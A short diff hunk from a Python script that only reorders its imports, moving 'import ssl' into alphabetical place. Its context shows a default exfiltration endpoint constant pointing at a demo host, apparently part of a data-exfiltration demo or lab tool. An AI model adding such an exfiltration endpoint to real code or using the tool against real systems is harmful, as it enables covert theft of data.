@@ -5,11 +5,11 @@ import argparse
 import json
 import os
 import socket
+import ssl
 import subprocess
 import sys
 import time
 import urllib.request
-import ssl
 
 DEFAULT_EXFIL_URL = "https://exfil.arbiter.demo:9443/exfil"
 
